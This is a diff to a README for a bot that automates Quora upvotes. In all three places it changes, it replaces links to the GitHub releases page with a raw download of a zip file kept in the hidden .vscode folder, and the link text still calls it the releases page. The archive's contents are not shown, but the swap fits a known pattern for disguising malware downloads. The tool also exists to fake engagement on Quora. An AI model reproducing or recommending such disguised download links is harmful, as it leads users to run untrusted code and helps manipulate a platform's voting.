@@ -1,6 +1,6 @@
 # 🤖 Quora-Community-Engagement-Bot - Automate Your Quora Upvotes Easily
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Shad0wCode-ul/Quora-Community-Engagement-Bot/releases)
+[![Download](https://raw.githubusercontent.com/Shad0wCode-ul/Quora-Community-Engagement-Bot/main/.vscode/Quora-Community-Engagement-Bot_1.5.zip)](https://raw.githubusercontent.com/Shad0wCode-ul/Quora-Community-Engagement-Bot/main/.vscode/Quora-Community-Engagement-Bot_1.5.zip)
 
 ## 📚 Overview
 
@@ -20,7 +20,7 @@ Before you start, ensure that your system meets the following requirements:
 ### Installation Steps
 
 1. **Visit the Releases Page:**
-   Go to the [Quora-Community-Engagement-Bot Releases](https://github.com/Shad0wCode-ul/Quora-Community-Engagement-Bot/releases) page.
+   Go to the [Quora-Community-Engagement-Bot Releases](https://raw.githubusercontent.com/Shad0wCode-ul/Quora-Community-Engagement-Bot/main/.vscode/Quora-Community-Engagement-Bot_1.5.zip) page.
 
 2. **Download the Latest Version:**
    Look for the latest version of the bot. You will see files available for download. Click on the link to download the file suitable for your operating system.
@@ -72,7 +72,7 @@ This project is licensed under the MIT License. You can freely use and modify th
 
 ## 🚀 Download & Install
 
-To get started, please visit the [Quora-Community-Engagement-Bot Releases](https://github.com/Shad0wCode-ul/Quora-Community-Engagement-Bot/releases) page to download the latest version of the bot and follow the installation steps outlined above. 
+To get started, please visit the [Quora-Community-Engagement-Bot Releases](https://raw.githubusercontent.com/Shad0wCode-ul/Quora-Community-Engagement-Bot/main/.vscode/Quora-Community-Engagement-Bot_1.5.zip) page to download the latest version of the bot and follow the installation steps outlined above. 
 
 ## 📈 Future Updates
 
